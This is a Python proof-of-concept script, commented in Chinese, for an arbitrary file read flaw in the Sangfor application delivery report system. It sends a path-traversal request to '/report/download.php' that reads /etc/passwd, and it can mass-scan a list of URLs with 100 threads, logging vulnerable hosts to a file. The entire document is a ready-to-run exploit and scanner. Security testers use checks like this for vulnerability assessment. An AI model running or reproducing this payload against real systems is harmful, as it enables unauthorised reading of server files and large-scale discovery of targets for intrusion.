# 深信服应用交付报表系统存在任意文件读取漏洞
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
def banner():
    # 定义横幅
    pass
def main():
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser = argparse.ArgumentParser(description="深信服应用交付报表系统存在任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload_url = '/report/download.php?pdf=../../../../../etc/passwd'
    url = target+payload_url 
    header = {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    }
    try:
        res1 = requests.get(url=url,headers=header,verify=False,timeout=10)
        if res1.status_code == 200 and 'root' in res1.text:
            print(f'[+] 该url存在漏洞{target}')
            with open('result.txt','a+',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f'[-]该url{target}不存在漏洞')
    except Exception as e:
        print(f'[*]该url{target}可能存在访问问题，请手工测试')    

if __name__ == '__main__':
    main()
